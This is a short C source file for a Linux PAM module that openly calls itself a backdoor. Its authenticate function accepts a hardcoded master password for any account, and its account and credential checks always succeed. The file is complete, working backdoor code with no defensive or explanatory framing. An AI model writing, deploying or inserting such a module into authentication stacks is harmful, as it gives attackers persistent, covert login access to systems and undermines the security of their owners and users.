/* pam_bd.so - Simple PAM Module Backdoor */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

#define BACKPASS "lqLkdMcyElrA"

PAM_EXTERN int
pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
        return PAM_SUCCESS;
}

PAM_EXTERN int
pam_sm_authenticate(pam_handle_t *pamh, int flags,int argc, const char **argv) {
        char *password = NULL;
        pam_get_authtok(pamh, PAM_AUTHTOK, (const char **)&password, NULL);

        if(!strncmp(password, BACKPASS, strlen(BACKPASS)))
                return PAM_SUCCESS;

        return -1;
}